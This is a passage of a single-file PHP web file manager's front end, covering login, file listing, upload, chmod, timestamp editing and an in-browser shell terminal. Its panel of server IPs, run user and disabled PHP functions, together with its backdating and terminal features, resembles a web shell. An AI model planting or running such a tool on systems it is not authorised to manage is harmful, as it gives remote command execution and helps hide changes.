      document.getElementById('loginForm').onsubmit=async e=>{e.preventDefault();const btn=e.currentTarget.querySelector('button');btn.disabled=true;try{let r=await fetch(location.href,{method:'POST',body:new URLSearchParams({action:'login',username:document.getElementById('loginUsername').value,password:document.getElementById('loginPassword').value})});let d=await r.json();if(d.success)location.reload();else{alert(d.error||'Login failed');btn.disabled=false}}catch(x){alert('Login error');btn.disabled=false}};
    </script>
    <?php else: ?>
    <a class="skip-link" href="#fileList">Skip to file list</a>
    <div class="file-manager-container">
      <aside class="sidebar" id="sidebar">
        <div class="sidebar-header">
          <div class="sidebar-logo"><i class="fas fa-folder"></i><span>File Manager</span></div><button class="sidebar-close-btn" data-fm-action="sidebar"><i class="fas fa-times"></i></button>
        </div>
        <nav class="sidebar-nav">
          <section class="nav-section quick-access-section">
            <div class="nav-section-title">Quick Access</div><button type="button" class="nav-item active" id="navHome" data-fm-action="home" onclick="return fmAction('home',event)"><i class="fas fa-home"></i><span>Home</span></button><button type="button" class="nav-item" data-fm-action="terminal" onclick="return fmAction('terminal',event)"><i class="fas fa-terminal"></i><span>Terminal</span></button><button type="button" class="nav-item" data-fm-action="currentfile" title="Return to the current File Manager PHP URL and keep the current folder"><i class="fas fa-file-code"></i><span>Current File</span></button><button class="nav-item" data-fm-action="upload"><i class="fas fa-upload"></i><span>Upload Files</span></button><button class="nav-item" data-fm-action="uploadzip"><i class="fas fa-file-archive"></i><span>Upload &amp; Unzip</span></button><button class="nav-item" data-fm-action="newfolder"><i class="fas fa-folder-plus"></i><span>New Folder</span></button><button class="nav-item" data-fm-action="newfile"><i class="fas fa-file-circle-plus"></i><span>New File</span></button>
          </section>
          <section class="nav-section">
            <div class="nav-section-title">Actions</div><button type="button" class="nav-item" data-fm-action="refresh" onclick="return fmAction('refresh',event)"><i class="fas fa-sync-alt"></i><span>Refresh</span></button><button class="nav-item" data-fm-action="selectall"><i class="fas fa-check-double"></i><span>Select All</span></button>
          </section>
          <section class="nav-section">
            <div class="nav-section-title">Preferences</div><button class="nav-item" data-fm-action="theme"><i class="fas fa-moon"></i><span>Toggle Theme</span></button><button class="nav-item" data-fm-action="toggleview"><i class="fas fa-table-cells"></i><span>Toggle View</span></button><button type="button" class="nav-item" data-fm-action="reset" onclick="return fmAction('reset',event)"><i class="fas fa-undo"></i><span>Reset Settings</span></button>
          </section>
        </nav>
        <div class="server-info-box" title="Live server diagnostics">
          <div class="server-info-title"><i class="fas fa-satellite-dish"></i> SYSTEM SNAPSHOT</div>
          <div class="server-info-subtitle">LIVE HOST • RUNTIME • NETWORK • STORAGE</div>
          <div class="server-info-line"><span class="si-label">[OS]</span><span class="si-value"><?=htmlspecialchars($FM_SERVER_INFO['os'], ENT_QUOTES, 'UTF-8')?></span></div>
          <div class="server-info-line"><span class="si-label">[WEB]</span><span class="si-value"><?=htmlspecialchars($FM_SERVER_INFO['server'], ENT_QUOTES, 'UTF-8')?></span></div>
          <div class="server-info-line"><span class="si-label">[PHP]</span><span class="si-value"><?=htmlspecialchars($FM_SERVER_INFO['php'], ENT_QUOTES, 'UTF-8')?></span></div>
          <div class="server-info-line si-status"><span class="si-label">[STATUS]</span><span class="si-value"><i class="fas fa-circle"></i> <?=htmlspecialchars($FM_SERVER_INFO['status'], ENT_QUOTES, 'UTF-8')?></span></div>
          <div class="server-info-line"><span class="si-label">[PUBLIC IP]</span><span class="si-value"><?=htmlspecialchars($FM_SERVER_INFO['publicIp'], ENT_QUOTES, 'UTF-8')?></span></div>
          <div class="server-info-line"><span class="si-label">[SERVER IP]</span><span class="si-value"><?=htmlspecialchars($FM_SERVER_INFO['serverIp'], ENT_QUOTES, 'UTF-8')?></span></div>
          <div class="server-info-line"><span class="si-label">[YOUR IP]</span><span class="si-value"><?=htmlspecialchars($FM_SERVER_INFO['clientIp'], ENT_QUOTES, 'UTF-8')?></span></div>
          <div class="server-info-line"><span class="si-label">[RUN USER]</span><span class="si-value"><?=htmlspecialchars($FM_SERVER_INFO['user'], ENT_QUOTES, 'UTF-8')?></span></div>
          <div class="server-info-line"><span class="si-label">[LOAD]</span><span class="si-value"><?=htmlspecialchars($FM_SERVER_INFO['load'], ENT_QUOTES, 'UTF-8')?></span></div>
          <?php $fmDisabled=$FM_SERVER_INFO['disabledFunctions']??[]; ?>
          <div class="server-lock-box">
            <div class="server-lock-head"><span class="si-label">[HARD LOCK]</span><span class="server-lock-count"><?=count($fmDisabled)?></span></div>
            <div class="server-lock-list"><?= $fmDisabled ? htmlspecialchars(implode(', ',$fmDisabled), ENT_QUOTES, 'UTF-8') : 'NONE DETECTED' ?></div>
          </div>
          <div class="server-info-line si-time"><span class="si-label">[TIME]</span><span class="si-value"><?=htmlspecialchars($FM_SERVER_INFO['time'], ENT_QUOTES, 'UTF-8')?></span></div>
          <div class="server-info-storage">
            <div class="server-storage-head"><span class="si-label">[STORAGE]</span><span class="si-free"><?=htmlspecialchars($FM_SERVER_INFO['free'], ENT_QUOTES, 'UTF-8')?> FREE</span></div>
            <div class="server-storage-bar" title="<?=htmlspecialchars((string)($FM_SERVER_INFO['freePct']??0), ENT_QUOTES, 'UTF-8')?>% free"><span style="width:<?=htmlspecialchars((string)($FM_SERVER_INFO['freePct']??0), ENT_QUOTES, 'UTF-8')?>%"></span></div>
          </div>
        </div>
        <?php if($FM_PASSWORD!==''): ?>
        <a class="sidebar-logout" href="?logout=1" onclick="return confirm('Logout from File Manager?')"><i class="fas fa-right-from-bracket"></i><span>Logout</span></a>
        <?php endif; ?>
      </aside>
      <div class="sidebar-overlay" id="overlay" data-fm-action="sidebar"></div>
      <main class="main-content">
        <header class="toolbar">
          <div class="toolbar-left"><button class="mobile-menu-toggle" data-fm-action="sidebar"><i class="fas fa-bars"></i></button>
            <div class="fm-breadcrumb" id="breadcrumb"></div>
            <div class="search-box"><input class="search-input" id="searchInput" placeholder="Search file" autocomplete="off"><i class="fas fa-search search-icon"></i></div>
          </div>
          <div class="toolbar-right">
            <div class="view-toggle"><button class="view-toggle-btn active" id="listViewBtn" data-fm-action="listview" title="List view"><i class="fas fa-list"></i></button><button class="view-toggle-btn" id="gridViewBtn" data-fm-action="gridview" title="Grid view"><i class="fas fa-table-cells"></i></button></div><button class="btn btn-primary" data-fm-action="upload"><i class="fas fa-upload"></i> Upload</button><button class="btn btn-light toolbar-btn-newfile" data-fm-action="newfile"><i class="fas fa-file-circle-plus"></i> New File</button><button class="btn btn-light toolbar-btn-newfolder" data-fm-action="newfolder"><i class="fas fa-folder-plus"></i> New Folder</button><button type="button" class="btn btn-light toolbar-btn-edit" id="toolbarPrimaryAction" data-fm-action="edit" onclick="return fmAction('edit',event)"><i class="fas fa-edit"></i> Edit</button><button type="button" class="btn btn-light toolbar-btn-download" data-fm-action="download" onclick="return fmAction('download',event)"><i class="fas fa-download"></i> Download</button><button type="button" class="btn btn-light toolbar-btn-copy" data-fm-action="copy" onclick="return fmAction('copy',event)"><i class="fas fa-copy"></i> Copy</button><button type="button" class="btn btn-light toolbar-btn-move" data-fm-action="move" onclick="return fmAction('move',event)"><i class="fas fa-arrows-alt"></i> Move</button><button type="button" class="btn btn-danger toolbar-btn-delete" data-fm-action="delete" onclick="return fmAction('delete',event)"><i class="fas fa-trash"></i> Delete</button>
          </div>
        </header>
        <section class="file-list-container" id="fileList" tabindex="0">
          <div id="listContent"></div>
        </section>
        <footer class="status-bar">
          <div class="status-left"><span id="itemCount">0 items</span><span id="selectedCount">0 selected</span></div>
          <div class="status-right"><span id="currentPath">/</span></div>
        </footer>
      </main>
    </div>
    <div class="modal" id="modal">
      <div class="modal-content" id="modalContent">
        <div class="modal-header"><span id="modalTitle"></span>
          <div id="editorHeaderTools" class="editor-header-tools" style="display:none"></div><button class="btn btn-icon-only btn-light" onclick="closeModal()"><i class="fas fa-times"></i></button>
        </div>
        <div class="modal-body" id="modalBody"></div>
        <div class="modal-footer" id="modalFooter"></div>
      </div>
    </div>
    <div class="toast" id="toast"></div>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.16/codemirror.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.16/addon/search/searchcursor.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.16/addon/dialog/dialog.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.16/addon/search/search.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.16/mode/javascript/javascript.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.16/mode/xml/xml.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.16/mode/css/css.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.16/mode/clike/clike.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.16/mode/php/php.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.16/mode/python/python.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.16/mode/sql/sql.min.js"></script>
    <script>
      const $=id=>document.getElementById(id);let initialUrlPath='/';try{const qp=new URL(location.href).searchParams.get('home');if(qp!==null&&qp!=='')initialUrlPath=qp;}catch(_){ }const state={dir:initialUrlPath,items:[],selected:new Set(),expanded:new Map(),grid:localStorage.getItem('fm_view')==='grid',theme:localStorage.getItem('fm_theme')||'dark',sort:'name',asc:true};let editor=null,editPathValue='',editorType='code',editorIsHtml=false,editorSaved='',editorBinary=false;let tinyEditor=null,editorFallback=false;
      function esc(s){return String(s??'').replace(/[&<>"']/g,m=>({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#039;'}[m]));}
      function js(s){return JSON.stringify(s).replace(/</g,'\\u003c');}
      function toast(msg){const el=$('toast');if(!el)return;el.textContent=String(msg||'');el.classList.add('show');clearTimeout(window.__toast);window.__toast=setTimeout(()=>el.classList.remove('show'),2600)}
      async function api(action,data={},file=null){const fd=new FormData();fd.append('action',action);for(const [k,v] of Object.entries(data)){if(v!==undefined&&v!==null)fd.append(k,typeof v==='object'?JSON.stringify(v):v)}if(file)fd.append('file',file);const r=await fetch(location.href,{method:'POST',body:fd,cache:'no-store',credentials:'same-origin'});if(action==='download')return r;let d;try{d=await r.json()}catch(e){throw Error('Server returned an invalid response. Check PHP error log.')}if(d.login){location.reload();return null}if(!d.success)throw Error(d.error||'Operation failed');return d}
      function iconFor(x){if(x.type==='folder'||x.type==='parent')return ['fas fa-folder','fa-folder'];const e=(x.extension||'').toLowerCase();const m={php:['fab fa-php','fa-php'],phtml:['fab fa-php','fa-php'],html:['fab fa-html5','fa-html5'],htm:['fab fa-html5','fa-html5'],css:['fab fa-css3-alt','fa-css3-alt'],js:['fab fa-js-square','fa-js'],json:['fas fa-code','fa-code'],py:['fab fa-python','fa-python'],java:['fab fa-java','fa-java'],sql:['fas fa-database','fa-database'],jpg:['fas fa-file-image','fa-file-image'],jpeg:['fas fa-file-image','fa-file-image'],png:['fas fa-file-image','fa-file-image'],gif:['fas fa-file-image','fa-file-image'],svg:['fas fa-file-image','fa-file-image'],webp:['fas fa-file-image','fa-file-image'],zip:['fas fa-file-archive','fa-file-archive'],rar:['fas fa-file-archive','fa-file-archive'],'7z':['fas fa-file-archive','fa-file-archive'],gz:['fas fa-file-archive','fa-file-archive'],pdf:['fas fa-file-pdf','fa-file-pdf'],txt:['fas fa-file-alt','fa-file-alt'],md:['fab fa-markdown','fa-markdown'],sh:['fas fa-terminal','fa-terminal']};return m[e]||['fas fa-file','fa-file'];}
      function crumb(){let parts=state.dir.split('/').filter(Boolean),html='<div class="breadcrumb-item"><button class="breadcrumb-link" onclick="go(\'/\')"><i class="fas fa-home"></i> </button></div>',cur='';parts.forEach((p,i)=>{cur+='/'+p;html+='<div class="breadcrumb-item"><button class="breadcrumb-link '+(i===parts.length-1?'current':'')+'" onclick="go('+js(cur)+')">'+esc(p)+'</button></div>'});$('breadcrumb').innerHTML=html;$('currentPath').textContent=state.dir;}
      function filtered(){const q=$('searchInput').value.trim().toLowerCase();return state.items.filter(x=>x.name.toLowerCase().includes(q));}
      function compare(a,b){
        if(a.type==='parent')return -1;if(b.type==='parent')return 1;
        const af=a.type==='folder',bf=b.type==='folder';
        if(af!==bf)return af?-1:1;
        if(state.sort==='size')return (a.size??-1)-(b.size??-1);
        if(state.sort==='modified')return a.modified-b.modified || a.name.localeCompare(b.name,undefined,{numeric:true,sensitivity:'base'});
        if(state.sort==='extension')return (a.extension||'').localeCompare(b.extension||'')||a.name.localeCompare(b.name,undefined,{numeric:true,sensitivity:'base'});
        return a.name.localeCompare(b.name,undefined,{numeric:true,sensitivity:'base'});
      }
      function sorted(arr){return arr.slice().sort((a,b)=>{if(a.type==='parent')return -1;if(b.type==='parent')return 1;const af=a.type==='folder',bf=b.type==='folder';if(af!==bf)return af?-1:1;const c=compare(a,b);return state.asc?c:-c})}
      function render(){const arr=sorted(filtered());$('itemCount').textContent=arr.filter(x=>x.type!=='parent').length+' items';$('selectedCount').textContent=state.selected.size+' selected';$('listContent').innerHTML=state.grid?gridHtml(arr):listHtml(arr);crumb();updatePrimaryToolbar();}
      function listHtml(arr){if(!arr.length)return '<div class="fm-empty"><i class="fas fa-folder-open"></i><div class="empty-state-text">This folder is empty</div><div class="empty-state-hint">Upload a file or create a new folder.</div></div>';let h='<div class="file-list-table"><div class="fm-head"><div><input class="fm-check" id="selectAllCheckbox" type="checkbox" '+(arr.filter(x=>x.type!=='parent').length&&arr.filter(x=>x.type!=='parent').every(x=>state.selected.has(x.fullPath))?'checked':'')+' onchange="toggleAllVisible(this.checked)"></div><div></div><div class="sortable-header" onclick="sortBy(\'name\')">NAME <span class="sort-indicator">'+(state.sort==='name'?(state.asc?'↑':'↓'):'↕')+'</span></div><div class="sortable-header" onclick="sortBy(\'extension\')">EXTENSION <span class="sort-indicator">'+(state.sort==='extension'?(state.asc?'↑':'↓'):'↕')+'</span></div><div class="sortable-header" onclick="sortBy(\'size\')">SIZE <span class="sort-indicator">'+(state.sort==='size'?(state.asc?'↑':'↓'):'↕')+'</span></div><div class="sortable-header" onclick="sortBy(\'modified\')">MODIFIED <span class="sort-indicator">'+(state.sort==='modified'?(state.asc?'↑':'↓'):'↕')+'</span></div><div>PERMISSION</div><div>ACTIONS</div></div>';for(const x of arr)h+=rowHtml(x,0);return h+'</div>'}
      function childRows(items,depth){let out='';for(const x of sorted(items.filter(i=>i.type!=='parent'))){out+=rowHtml(x,depth)}return out}
      function rowHtml(x,depth=0){const parent=x.type==='parent',sel=!parent&&state.selected.has(x.fullPath),[ic,cl]=iconFor(x),isFolder=x.type==='folder',path=esc(x.fullPath),name=esc(x.name),expanded=state.expanded.has(x.fullPath);let actions='';if(isFolder){actions=`<button type="button" class="fm-action zip" title="ZIP - Create ZIP file" aria-label="ZIP" data-file-action="zip" data-path="${path}" onclick="fileAction('zip',${esc(js(x.fullPath))},${esc(js(x.name))},'folder');return false"><i class="fas fa-file-archive"></i></button><button type="button" class="fm-action downloadzip" title="DOWNLOAD VIA ZIP - Create and download ZIP" aria-label="DOWNLOAD VIA ZIP" data-file-action="downloadzip" data-path="${path}" onclick="fileAction('downloadzip',${esc(js(x.fullPath))},${esc(js(x.name))},'folder');return false"><i class="fas fa-file-download"></i></button><button type="button" class="fm-action rename" title="Rename" data-file-action="rename" data-path="${path}" data-name="${name}" onclick="fileAction('rename',${esc(js(x.fullPath))},${esc(js(x.name))},${esc(js(x.type))});return false"><i class="fas fa-i-cursor"></i></button><button type="button" class="fm-action copy" title="Copy" data-file-action="copy" data-path="${path}" onclick="fileAction('copy',${esc(js(x.fullPath))},${esc(js(x.name))},${esc(js(x.type))});return false"><i class="fas fa-copy"></i></button><button type="button" class="fm-action move" title="Move" data-file-action="move" data-path="${path}" onclick="fileAction('move',${esc(js(x.fullPath))},${esc(js(x.name))},${esc(js(x.type))});return false"><i class="fas fa-arrows-alt"></i></button><button type="button" class="fm-action direct-link" title="Direct link - Open in new tab" aria-label="Direct link" data-file-action="direct-link" data-path="${path}" onclick="fileAction('direct-link',${esc(js(x.fullPath))},${esc(js(x.name))},${esc(js(x.type))});return false"><i class="fas fa-link"></i></button><button type="button" class="fm-action touch" title="Change Modified Time (touch)" data-file-action="touch" data-path="${path}" data-name="${name}" onclick="fileAction('touch',${esc(js(x.fullPath))},${esc(js(x.name))},${esc(js(x.type))},${esc(js(x.modifiedInput||''))});return false"><i class="fas fa-clock"></i></button><button type="button" class="fm-action chmod" title="Change Permissions (chmod)" data-file-action="chmod" data-path="${path}" data-name="${name}" onclick="fileAction('chmod',${esc(js(x.fullPath))},${esc(js(x.name))},${esc(js(x.type))});return false"><i class="fas fa-key"></i></button><button type="button" class="fm-action delete" title="Delete" data-file-action="delete" data-path="${path}" onclick="fileAction('delete',${esc(js(x.fullPath))},${esc(js(x.name))},${esc(js(x.type))});return false"><i class="fas fa-trash"></i></button>`}else if(!parent){const isZip=(x.extension||'').toLowerCase()==='zip';actions=`${isZip?`<button type="button" class="fm-action unzip" title="Unzip" data-file-action="unzip" data-path="${path}" data-name="${name}" onclick="fileAction('unzip',${esc(js(x.fullPath))},${esc(js(x.name))},'file');return false"><i class="fas fa-file-zipper"></i></button><button type="button" class="fm-action view" title="File Viewer - View ZIP contents" data-file-action="view" data-path="${path}" onclick="fileAction('view',${esc(js(x.fullPath))},${esc(js(x.name))},'file');return false"><i class="fas fa-eye"></i></button>`:`<button type="button" class="fm-action edit" title="Edit" data-file-action="edit" data-path="${path}" data-name="${name}" onclick="fileAction('edit',${esc(js(x.fullPath))},${esc(js(x.name))},'file');return false"><i class="fas fa-edit"></i></button><button type="button" class="fm-action zip" title="ZIP - Create ZIP file" data-file-action="zip" data-path="${path}" data-name="${name}" onclick="fileAction('zip',${esc(js(x.fullPath))},${esc(js(x.name))},'file');return false"><i class="fas fa-file-archive"></i></button>`}${fileKind(x)&&!isZip?`<button type="button" class="fm-action view" title="File Viewer - Preview" data-file-action="view" data-path="${path}" onclick="fileAction('view',${esc(js(x.fullPath))},${esc(js(x.name))},'file');return false"><i class="fas fa-eye"></i></button>`:''}<button type="button" class="fm-action download" title="Download" data-file-action="download" data-path="${path}" onclick="fileAction('download',${esc(js(x.fullPath))},${esc(js(x.name))},'file');return false"><i class="fas fa-download"></i></button><button type="button" class="fm-action rename" title="Rename" data-file-action="rename" data-path="${path}" data-name="${name}" onclick="fileAction('rename',${esc(js(x.fullPath))},${esc(js(x.name))},${esc(js(x.type))});return false"><i class="fas fa-i-cursor"></i></button><button type="button" class="fm-action copy" title="Copy" data-file-action="copy" data-path="${path}" onclick="fileAction('copy',${esc(js(x.fullPath))},${esc(js(x.name))},${esc(js(x.type))});return false"><i class="fas fa-copy"></i></button><button type="button" class="fm-action move" title="Move" data-file-action="move" data-path="${path}" onclick="fileAction('move',${esc(js(x.fullPath))},${esc(js(x.name))},${esc(js(x.type))});return false"><i class="fas fa-arrows-alt"></i></button><button type="button" class="fm-action direct-link" title="Direct link - Open in new tab" aria-label="Direct link" data-file-action="direct-link" data-path="${path}" onclick="fileAction('direct-link',${esc(js(x.fullPath))},${esc(js(x.name))},${esc(js(x.type))});return false"><i class="fas fa-link"></i></button><button type="button" class="fm-action touch" title="Change Modified Time (touch)" data-file-action="touch" data-path="${path}" data-name="${name}" onclick="fileAction('touch',${esc(js(x.fullPath))},${esc(js(x.name))},${esc(js(x.type))},${esc(js(x.modifiedInput||''))});return false"><i class="fas fa-clock"></i></button><button type="button" class="fm-action chmod" title="Change Permissions (chmod)" data-file-action="chmod" data-path="${path}" data-name="${name}" onclick="fileAction('chmod',${esc(js(x.fullPath))},${esc(js(x.name))},${esc(js(x.type))});return false"><i class="fas fa-key"></i></button><button type="button" class="fm-action delete" title="Delete" data-file-action="delete" data-path="${path}" onclick="fileAction('delete',${esc(js(x.fullPath))},${esc(js(x.name))},${esc(js(x.type))});return false"><i class="fas fa-trash"></i></button>`}
      let html=`<div class="fm-row ${sel?'selected':''}" data-path="${path}" data-row-type="${x.type}" style="--depth:${depth}" draggable="${!parent}" ondragstart="dragStart(event,${esc(js(x.fullPath))})" ondragover="dragOver(event,${esc(js(x.fullPath))},${esc(js(x.type))})" ondrop="dropTo(event,${esc(js(x.fullPath))},${esc(js(x.type))})"><div>${parent?'':`<input class="fm-check" type="checkbox" ${sel?'checked':''} data-check-path="${path}">`}</div><div class="fm-chevron">${isFolder?`<button type="button" class="folder-chevron ${expanded?'open':''}" title="${expanded?'Collapse':'Expand'}" data-folder-toggle="${path}" onclick="toggleFolder(event,${esc(js(x.fullPath))});return false"><i class="fas fa-chevron-right"></i></button>`:''}</div><div class="fm-name ${fileKind(x)?'fm-previewable':''}" ${fileKind(x)?`onclick="fileAction('view',${esc(js(x.fullPath))},${esc(js(x.name))},'file');return false"`:''}><i class="fm-icon ${ic} ${cl}"></i><span title="${name}">${name}</span>${fileKind(x)==='image'?`<span class="fm-hover-preview"><img src="${esc(directFileUrl(x.fullPath,'file'))}" alt="${name}" loading="lazy"></span>`:''}</div><div class="fm-ext">${x.extension?'<span class="file-extension-badge" data-ext="'+esc(x.extension)+'">'+esc(x.extension)+'</span>':'-'}</div><div class="fm-size">${esc(x.sizeText||'-')}</div><div class="fm-date-wrap"><span class="fm-date-text" title="${esc(x.modifiedText||'')}">${esc(x.modifiedText||'')}</span>${x.modifiedText?`<button type="button" class="fm-copy-date" title="Copy modified date" aria-label="Copy modified date" onclick="copyModifiedDate(${esc(js(x.modifiedText||''))});return false"><i class="fas fa-copy"></i></button>`:''}</div><div class="fm-permission"><code>${esc(x.permission||'----')}</code></div><div class="fm-actions">${parent?'':actions}</div></div>`;
      if(isFolder&&expanded&&state.expanded.get(x.fullPath))html+=childRows(state.expanded.get(x.fullPath),depth+1);return html}
      function gridHtml(arr){if(!arr.length)return '<div class="fm-empty"><i class="fas fa-folder-open"></i><div class="empty-state-text">This folder is empty</div></div>';return '<div class="fm-grid">'+arr.map(x=>{const sel=state.selected.has(x.fullPath),[ic,cl]=iconFor(x);return `<div class="fm-card ${sel?'selected':''}" data-path="${esc(x.fullPath)}" data-row-type="${x.type}" draggable="${x.type!=='parent'}" ${fileKind(x)?`onclick="fileAction('view',${esc(js(x.fullPath))},${esc(js(x.name))},'file');return false"`:''} ondragstart="dragStart(event,${esc(js(x.fullPath))})"><input class="fm-check" type="checkbox" ${sel?'checked':''} data-check-path="${esc(x.fullPath)}" style="position:absolute;top:10px;right:10px"><div class="fm-icon ${ic} ${cl}"></div><div title="${esc(x.name)}">${esc(x.name)}</div><div class="fm-size">${esc(x.sizeText||'-')}</div></div>`}).join('')+'</div>'}
      function sortBy(c){if(state.sort===c)state.asc=!state.asc;else{state.sort=c;state.asc=true}render()}
      function toggle(p){state.selected.has(p)?state.selected.delete(p):state.selected.add(p);render()}
      function toggleAllVisible(v){filtered().filter(x=>x.type!=='parent').forEach(x=>v?state.selected.add(x.fullPath):state.selected.delete(x.fullPath));state.selected.delete('/');state.selected.delete(state.dir==='/'?'':state.dir+'/..');render()}
      function selectAll(){toggleAllVisible(true)}
      function clickItem(e,p,t){if(e.target.closest('.fm-actions,.folder-chevron,.fm-check'))return;if(e.ctrlKey||e.metaKey){toggle(p);return}if(t==='parent'){go(p);return}if(t==='folder'){go(p);return}state.selected.clear();state.selected.add(p);render()}
      async function toggleFolder(e,p){e.preventDefault();e.stopPropagation();if(state.expanded.has(p)){state.expanded.delete(p);render();return}try{const d=await api('list',{dir:p,_expand:String(Date.now())});state.expanded.set(p,d.items||[]);render()}catch(x){toast(x.message||'Unable to open folder')}}
      function go(p,replaceUrl=false){p=p||'/';const u=new URL(location.href);if(p==='/')u.searchParams.delete('home');else u.searchParams.set('home',p);u.searchParams.delete('path');if(replaceUrl){history.replaceState({home:p},'',u);state.dir=p;state.selected.clear();state.expanded.clear();$('searchInput').value='';load();}else{window.location.assign(u.href);}if(innerWidth<=1024)$('sidebar').classList.remove('open');}
      async function load(showMessage=false){try{const d=await api('list',{dir:state.dir,_refresh:String(Date.now())});state.items=d.items||[];state.expanded.clear();render();if(showMessage)toast('Refreshed')}catch(e){toast(e.message)}}
      async function refreshFiles(){try{const d=await api('list',{dir:state.dir,_refresh:String(Date.now())});state.items=d.items||[];state.expanded.clear();state.selected.clear();render();toast('Refreshed');}catch(e){toast(e.message||'Refresh failed')}}
      function setView(grid){state.grid=!!grid;localStorage.setItem('fm_view',state.grid?'grid':'list');$('gridViewBtn').classList.toggle('active',state.grid);$('listViewBtn').classList.toggle('active',!state.grid);render()}
      function toggleSidebar(){const s=$('sidebar');s.classList.toggle('open');$('overlay').classList.toggle('show',s.classList.contains('open'))}
      function toggleTheme(){state.theme=state.theme==='dark'?'light':'dark';localStorage.setItem('fm_theme',state.theme);applyTheme()}
      function applyTheme(){document.body.dataset.theme=state.theme;if(state.theme==='light'){document.documentElement.dataset.theme='light'}else{document.documentElement.dataset.theme='dark'}}
      function resetSettings(){
        state.selected.clear();
        state.items=[];
        state.sort='name';
        state.asc=true;
        state.theme='dark';
        state.grid=false;
        state.dir=<?=json_encode($FM_HOME_REL)?>;
        $('searchInput').value='';
        localStorage.removeItem('fm_theme');
        localStorage.removeItem('fm_view');
        applyTheme();
        $('gridViewBtn').classList.remove('active');
        $('listViewBtn').classList.add('active');
        state.expanded.clear();
        render();
        load().then(()=>toast('Settings reset')).catch(()=>toast('Settings reset'));
      }
      function modal(title,body,footer,editorMode=false){$('modalTitle').textContent=title;$('modalBody').innerHTML=body;$('modalFooter').innerHTML=footer;$('modal').classList.toggle('editor-modal',editorMode);$('editorHeaderTools').style.display=editorMode?'flex':'none';$('editorHeaderTools').innerHTML='';$('modal').classList.add('show')}
      function getEditorContent(){
        if(editorType==='wysiwyg'&&tinyEditor){try{tinyEditor.save();return $('codeEditor')?.value||tinyEditor.getContent();}catch(_){}}
        if(editor&&typeof editor.getValue==='function')return editor.getValue();
        return $('codeEditor')?.value||'';
      }
      function destroyTiny(){
        if(tinyEditor){try{if(window.tinymce)tinymce.remove('#codeEditor')}catch(_){}tinyEditor=null;}
      }
      function destroyEditor(){
        destroyTiny();
        if(editor){try{if(typeof editor.toTextArea==='function')editor.toTextArea()}catch(_){}
          editor=null;
        }
        editorFallback=false;
      }
      function closeModal(){
        const current=getEditorContent();
        if(editPathValue&&current!==editorSaved){if(!confirm('You have unsaved changes. Close anyway?'))return}
        destroyEditor();
        editPathValue='';editorSaved='';editorType='code';editorIsHtml=false;
        $('editorHeaderTools').style.display='none';$('editorHeaderTools').innerHTML='';
        $('modalContent').classList.remove('fm-editor-fullscreen');
        $('modal').classList.remove('fm-editor-modal-fullscreen');
        $('modal').classList.remove('show');$('modalContent').classList.remove('fm-file-viewer-modal');$('modal').classList.remove('terminal-modal');$('modalBody').innerHTML='';$('modalFooter').innerHTML='';
      }
      
      let terminalHistory=[];let terminalHistoryIndex=-1;let terminalCwd='/';let terminalCwdMode='fm';let terminalStartCwd='/';let terminalStartMode='fm';
      function setTerminalCwd(p,mode='fm'){terminalCwd=p||'/';terminalCwdMode=mode||'fm';const el=$('terminalCwd');if(el)el.textContent=terminalCwd;const out=$('terminalOutput');if(out)out.insertAdjacentHTML('beforeend','<div class="term-muted">↪ Working directory: '+esc(terminalCwd)+'</div>');if(out)out.scrollTop=out.scrollHeight;const input=$('terminalInput');if(input)input.focus();}
      function terminalHome(){setTerminalCwd('<?=htmlspecialchars($FM_HOME_REL,ENT_QUOTES,'UTF-8')?>','fm');}
      function terminalCurrentDir(){setTerminalCwd(state.dir||'/','fm');}
      function terminalStart(){setTerminalCwd(terminalStartCwd||'/','fm');}
      function openTerminal(){
        terminalCwd=state.dir||'/';terminalCwdMode='fm';terminalStartCwd=terminalCwd;terminalStartMode='fm';
        modal('Terminal','<div class="fm-terminal-head"><span><i class="fas fa-terminal"></i> <span id="terminalIdentity"><?=htmlspecialchars($FM_TERM_USER,ENT_QUOTES,'UTF-8')?>@<?=htmlspecialchars($FM_TERM_HOST,ENT_QUOTES,'UTF-8')?>:&ensp;</span></span><span class="fm-terminal-cwd" id="terminalCwd">'+esc(terminalCwd)+'</span><span class="fm-terminal-nav"><button type="button" onclick="terminalStart()" title="Back to terminal starting directory">Start</button><button type="button" onclick="terminalCurrentDir()" title="Go to current File Manager directory">Current</button><button type="button" onclick="terminalHome()" title="Go to server filesystem root">Home</button></span></div><div class="fm-terminal-output" id="terminalOutput"><div class="term-muted">Ready. Working directory: '+esc(terminalCwd)+'</div></div><div class="fm-terminal-line"><span class="fm-terminal-prompt" id="terminalPrompt">$</span><input id="terminalInput" class="fm-terminal-input" autocomplete="off" spellcheck="false" placeholder="Type a command…"><button type="button" class="fm-terminal-run" id="terminalRun"><i class="fas fa-play"></i></button></div>','<button class="btn btn-light" onclick="clearTerminal()"><i class="fas fa-eraser"></i> Clear</button><button class="btn btn-light" onclick="closeModal()">Close</button>',false);
        $('modal').classList.add('terminal-modal');
        const input=$('terminalInput');input.focus();
        $('terminalRun').onclick=runTerminalCommand;
        input.onkeydown=e=>{if(e.key==='Enter'){e.preventDefault();runTerminalCommand();}else if(e.key==='ArrowUp'){e.preventDefault();if(terminalHistory.length){terminalHistoryIndex=Math.max(0,terminalHistoryIndex-1);input.value=terminalHistory[terminalHistoryIndex]||'';}}else if(e.key==='ArrowDown'){e.preventDefault();if(terminalHistory.length){terminalHistoryIndex=Math.min(terminalHistory.length,terminalHistoryIndex+1);input.value=terminalHistory[terminalHistoryIndex]||'';}}else if(e.ctrlKey&&e.key.toLowerCase()==='l'){e.preventDefault();clearTerminal();}};
      }
